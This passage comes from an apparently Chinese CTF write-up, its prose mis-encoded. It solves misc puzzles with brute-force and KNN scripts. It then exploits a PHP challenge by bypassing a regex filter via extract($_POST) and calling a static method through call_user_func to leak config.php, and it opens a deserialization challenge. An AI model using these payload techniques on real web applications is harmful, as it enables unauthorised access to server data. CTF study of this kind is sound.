å‹ç¼©æ–‡æ¡£ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953416088/31f8de779dbf7196256d60d05abc4c30f69804f2.png"></p><p>å°† rar å‹ç¼©æ–‡æ¡£è§£å‹å¯å¾—ä¸€å¼ å›¾ç‰‡ã€‚010 editor æ‰“å¼€å›¾ç‰‡å¯å‘ç°æ–‡ä»¶å°¾éƒ¨æœ‰ zip å‹ç¼©æ–‡æ¡£ï¼Œå°†å…¶æå–å‡ºæ¥ã€‚ä½¿ç”¨ Cloakify çš„è§£å¯†å·¥å…·ï¼Œç¬¬ä¸€æ­¥å¾—åˆ°çš„æ–‡æœ¬æ–‡æ¡£çš„å†…å®¹ä½œä¸º key è§£å¯† rar å‹ç¼©æ–‡æ¡£çš„æ³¨é‡Šå†…å®¹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953514193/7be4f251830ddd0db58917b2ec371e2be6a1e7e3.png"></p><p>å¾—åˆ°æå–å‡ºæ¥çš„ zip å‹ç¼©åŒ…çš„å¯†ç  <code>D3arD4La0P1e45eD4iDa1Wo</code>ã€‚è§£å‹æå–å‡ºæ¥çš„ zip å‹ç¼©æ–‡æ¡£ä¹‹åå¯ä»¥å¾—åˆ°ä¸€ä¸ª .pyc æ–‡ä»¶ã€‚å°†å…¶ä½¿ç”¨<a href="http://tools.bugscaner.com/decompyle/">åœ¨çº¿åç¼–è¯‘å·¥å…·</a>åç¼–è¯‘ä¹‹åå¯ä»¥å¾—åˆ°å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python 3.7 (3394)</span></span><br><span class="line"><span class="comment"># Compiled at: 1969-12-31 18:00:00</span></span><br><span class="line"><span class="comment">#Powered by BugScaner</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re, hashlib, random</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;jiu_bu_gao_su_ni&#125;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> re.fullmatch(<span class="string">&#x27;^flag&#123;[A-Z][0-9a-zA-Z]&#123;4&#125;&#125;$&#x27;</span>, flag):</span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(flag.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    m = m.hexdigest()</span><br><span class="line">    col = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">24</span>, <span class="number">2</span>):</span><br><span class="line">        tmp = <span class="built_in">int</span>(m[i:i + <span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">        tmp += random.randint(-<span class="number">5</span>, <span class="number">5</span>)</span><br><span class="line">        col += [tmp]</span><br><span class="line"></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">1024</span>, <span class="number">512</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        timg = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">256</span>, <span class="number">512</span>), <span class="built_in">tuple</span>(col[i * <span class="number">3</span>:i * <span class="number">3</span> + <span class="number">3</span>]))</span><br><span class="line">        img.paste(timg, (i * <span class="number">256</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    img.save(<span class="string">&#x27;C:/Users/Administrator/Desktop/setu.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç»“åˆå‰é¢å¾—åˆ°çš„å›¾ç‰‡å¯çŸ¥ flag çš„æ ¼å¼ï¼Œå°è¯•å†™è„šæœ¬çˆ†ç ´ flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953611917/e4a05c1c009b678edcb8b0c7ef39554151c066a1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">colors = [<span class="number">139</span>, <span class="number">102</span>, <span class="number">162</span>, <span class="number">24</span>, <span class="number">85</span>, <span class="number">57</span>, <span class="number">160</span>, <span class="number">37</span>, <span class="number">239</span>, <span class="number">200</span>, <span class="number">154</span>, <span class="number">30</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">125</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">125</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">125</span>):</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">125</span>):</span><br><span class="line">                flag = <span class="string">&quot;flag&#123;D&quot;</span> + <span class="built_in">chr</span>(i) + <span class="built_in">chr</span>(j) + <span class="built_in">chr</span>(k) + <span class="built_in">chr</span>(n) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">                <span class="keyword">if</span> re.fullmatch(<span class="string">&#x27;^flag&#123;[A-Z][0-9a-zA-Z]&#123;4&#125;&#125;$&#x27;</span>, flag):</span><br><span class="line">                    m = hashlib.md5()</span><br><span class="line">                    m.update(flag.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">                    m = m.hexdigest()</span><br><span class="line">                    runCount = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">24</span>, <span class="number">2</span>):</span><br><span class="line">                        color = colors[runCount]</span><br><span class="line">                        tmp = <span class="built_in">int</span>(m[x:x + <span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">                        <span class="keyword">if</span> -<span class="number">5</span> &lt; (tmp - color) &lt; <span class="number">5</span>:</span><br><span class="line">                            runCount += <span class="number">1</span></span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">elif</span> x == <span class="number">22</span>:  <span class="comment"># 23 - 1</span></span><br><span class="line">                            <span class="built_in">print</span>(flag)</span><br><span class="line">                            exit(<span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;D4n1U&#125;</span><br></pre></td></tr></table></figure><h3 id="ç«¥è¯é•‡"><a href="#ç«¥è¯é•‡" class="headerlink" title="ç«¥è¯é•‡"></a>ç«¥è¯é•‡</h3><p>å°†æ–‡ä»¶åˆ†ç¦»è§£å‹ä¹‹åå¾—åˆ°è®­ç»ƒé›†å’Œ flagï¼Œä»ç½‘ä¸Šæ‰¾äº†ä¸€æ®µ KNN çš„ç®—æ³•ç¨å¾®ä¿®æ”¹ä¸€ä¸‹å³å¯ç®—å‡º flag çš„æ ‡ç­¾ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##ç»™å‡ºè®­ç»ƒæ•°æ®ä»¥åŠå¯¹åº”çš„ç±»åˆ«</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createDataSet</span>():</span></span><br><span class="line">    groups = []</span><br><span class="line">    labels = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;t.txt&quot;</span>):</span><br><span class="line">        group = []</span><br><span class="line">        label = line[<span class="number">0</span>]</span><br><span class="line">        line = line[<span class="number">2</span>:]</span><br><span class="line">        line = line.lstrip(<span class="string">&quot;[&quot;</span>).rstrip(<span class="string">&quot;]\n&quot;</span>).split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> line:</span><br><span class="line">            group.append(<span class="built_in">int</span>(x))</span><br><span class="line">        groups.append(group)</span><br><span class="line">        labels.append(label)</span><br><span class="line">    <span class="built_in">print</span>(groups)</span><br><span class="line">    <span class="keyword">return</span> array(groups), labels</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">###é€šè¿‡KNNè¿›è¡Œåˆ†ç±»</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">classify</span>(<span class="params"><span class="built_in">input</span>, dataSet, label, k</span>):</span></span><br><span class="line">    dataSize = dataSet.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">####è®¡ç®—æ¬§å¼è·ç¦»</span></span><br><span class="line">    diff = tile(<span class="built_in">input</span>, (dataSize, <span class="number">1</span>)) - dataSet</span><br><span class="line">    sqdiff = diff ** <span class="number">2</span></span><br><span class="line">    squareDist = <span class="built_in">sum</span>(sqdiff, axis=<span class="number">1</span>)  <span class="comment">###è¡Œå‘é‡åˆ†åˆ«ç›¸åŠ ï¼Œä»è€Œå¾—åˆ°æ–°çš„ä¸€ä¸ªè¡Œå‘é‡</span></span><br><span class="line">    dist = squareDist ** <span class="number">0.5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">##å¯¹è·ç¦»è¿›è¡Œæ’åº</span></span><br><span class="line">    sortedDistIndex = argsort(dist)  <span class="comment">##argsort()æ ¹æ®å…ƒç´ çš„å€¼ä»å¤§åˆ°å°å¯¹å…ƒç´ è¿›è¡Œæ’åºï¼Œè¿”å›ä¸‹æ ‡</span></span><br><span class="line"></span><br><span class="line">    classCount = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">        voteLabel = label[sortedDistIndex[i]]</span><br><span class="line">        <span class="comment">###å¯¹é€‰å–çš„Kä¸ªæ ·æœ¬æ‰€å±çš„ç±»åˆ«ä¸ªæ•°è¿›è¡Œç»Ÿè®¡</span></span><br><span class="line">        classCount[voteLabel] = classCount.get(voteLabel, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">    <span class="comment">###é€‰å–å‡ºç°çš„ç±»åˆ«æ¬¡æ•°æœ€å¤šçš„ç±»åˆ«</span></span><br><span class="line">    maxCount = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> classCount.items():</span><br><span class="line">        <span class="keyword">if</span> value &gt; maxCount:</span><br><span class="line">            maxCount = value</span><br><span class="line">            classes = key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> classes</span><br><span class="line"></span><br><span class="line">dataSet, labels = createDataSet()</span><br><span class="line">inputs = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>):</span><br><span class="line">    <span class="built_in">input</span> = []</span><br><span class="line">    line = line.lstrip(<span class="string">&quot;[&quot;</span>).rstrip(<span class="string">&quot;]\n&quot;</span>).split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> line:</span><br><span class="line">        <span class="built_in">input</span>.append(<span class="built_in">int</span>(x))</span><br><span class="line">    inputs.append(<span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;KNNresulta.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">input</span> <span class="keyword">in</span> inputs:</span><br><span class="line">    output = classify(array(<span class="built_in">input</span>), dataSet, labels, <span class="number">2</span>)</span><br><span class="line">    file.write(output)</span><br><span class="line">    <span class="built_in">print</span>(output)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>é€šè¿‡æ ‡ç­¾æ•°é‡å¯ä»¥ç¡®å®šå›¾ç‰‡çš„å°ºå¯¸ï¼Œå†™è„šæœ¬æ±‚å‡ºæ ‡ç­¾æ•°é‡çš„çº¦æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">78289</span> // <span class="number">2</span> + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">78289</span> % x == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Found number &#123;&#125;&quot;</span>.<span class="built_in">format</span>(x))</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“å¾—å‡ºå›¾ç‰‡å°ºå¯¸ä¸º 79x991ã€‚å°†æ ‡ç­¾è½¬æ¢ä¸ºåƒç´ ä»è€Œæ„å»ºå›¾ç‰‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">flagFile = <span class="built_in">open</span>(<span class="string">&quot;KNNresulta.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">flagStream = flagFile.read().rstrip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">image = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">79</span>, <span class="number">991</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">79</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">991</span>):</span><br><span class="line">        pixel = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="keyword">if</span> <span class="built_in">int</span>(flagStream[i * <span class="number">991</span> + j]) <span class="keyword">else</span> (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        image.putpixel((i, j), pixel)</span><br><span class="line">image = image.transpose(Image.FLIP_TOP_BOTTOM)</span><br><span class="line">image.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>å°†å¾—åˆ°çš„å›¾ç‰‡é¡ºæ—¶é’ˆæ—‹è½¬ 90Â° å¯å¾—åˆ°å¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953764336/e361a2af8783d278d28d24e5e87083c0406244c2.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;67373æ°¸ç”Ÿ_ä¸¾æŠ¥ç‹—å¿…é¡»æ­»&#125;</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="veryphp"><a href="#veryphp" class="headerlink" title="veryphp"></a>veryphp</h3><p>ä»£ç å®¡è®¡é¢˜ç›®ï¼Œç»™å‡ºçš„æºä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">qwq</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Access Denied!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">oao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        show_source(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\_|\.|%|\*|\~|\^|\&#x27;|\&quot;|\;|\(|\)|\]|g|e|l|i|\//is&#x27;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;I am sorry but you have to leave.&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_POST</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shaw_root</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\-[a-e][^a-zA-Z0-8]&lt;b&gt;(.*)&gt;&#123;4&#125;\D*?(abc.*?)p(hp)*\@R(s|r).$/&#x27;</span>, <span class="variable">$shaw_root</span>)&amp;&amp; strlen(<span class="variable">$shaw_root</span>)===<span class="number">29</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Almost there.&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Input correct parameters&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ans</span>===<span class="variable">$SecretNumber</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Congratulations!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    call_user_func(<span class="variable">$my_ans</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆæƒ³åŠæ³•æ‹¿åˆ° hintï¼Œæ‰èƒ½å†å»æ„é€  <code>$SecretNumber</code>ã€‚å› æ­¤å…ˆå¯¹ç€æ­£åˆ™å·¥å…·æ„é€ ä¸€ä¸²åˆç†çš„å­—ç¬¦ä¸²ä½¿ä¹‹èƒ½åˆ° <code>echo $hint;</code> å¤„ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953880868/1644bad21e153b52561ddf0b8fbb70b4198966fa.png"></p><p>æ¥ä¸‹æ¥å°±æ˜¯ <code>extract($_POST);</code> è®¾ç½®çš„å˜é‡ä¸º <code>shaw_root</code>ï¼Œä½†æ˜¯åœ¨ POST çš„å­—ç¬¦ä¸²ä¸­ä¸‹åˆ’çº¿è¢«æ­£åˆ™æŒ¡ä½äº†ï¼Œå› æ­¤ä½¿ç”¨ç©ºæ ¼æ¥ä»£æ›¿ã€‚å†™å‡ºè¿™ä¸€éƒ¨åˆ†çš„ payloadï¼Œå¾—åˆ° hintã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shaw root&#x3D;-a9&lt;b&gt;aaaaaaaaaa&gt;&gt;&gt;&gt;aabcp@Rsa</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)&#x3D;&#x3D;166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)&#x3D;&#x3D;&#x3D;5</span><br></pre></td></tr></table></figure><p>äºæ˜¯å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹è¿™ä¸ª <code>$SecretNumber</code>ï¼Œå¾—åˆ°ç»“æœæ˜¯ 21475ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">99999</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$num</span> = sprintf(<span class="string">&quot;%05d&quot;</span>, <span class="variable">$i</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;shaw&quot;</span> . (<span class="variable">$num</span>) . <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="variable">$md5Str</span> = md5(<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$md5Str</span> == <span class="string">&quot;166b47a5cb1ca2431a0edfcef200684f&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Found: &quot;</span> . <span class="variable">$num</span> . PHP_EOL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Trying: &quot;</span> . <span class="variable">$num</span> . <span class="string">&quot; as &quot;</span> . <span class="variable">$md5Str</span> . PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ° Congratulation ä¹‹åå°±æ˜¯è¦æƒ³åŠæ³•åˆ°è¾¾ <code>show_source(&quot;config.php&quot;)</code> å¤„ã€‚å› ä¸º <code>oao()</code> æ˜¯ä¸ªé™æ€æ–¹æ³•ï¼Œæ‰€ä»¥ç›´æ¥ä¼ å…¥ <code>qwq::oao</code> å°±èƒ½è¢« <code>call_user_func($my_ans)</code> è°ƒç”¨åˆ°ã€‚å› æ­¤æœ€åçš„ payload å¦‚ä¸‹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shaw root&#x3D;-a9&lt;b&gt;aaaaaaaaaa&gt;&gt;&gt;&gt;aabcp@Rsa&amp;ans&#x3D;21475&amp;my ans&#x3D;qwq::oao</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d66c779bdd97750eb2b0a6a34384b901&#125;</span><br></pre></td></tr></table></figure><h3 id="spaceman"><a href="#spaceman" class="headerlink" title="spaceman"></a>spaceman</h3><p>ååºåˆ—åŒ–çš„ä»£ç å®¡è®¡ï¼Œç»™å‡ºçš„ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">spaceman</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">&#x27;ctfshowvip&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;ctfshowup&#x27;</span>,<span 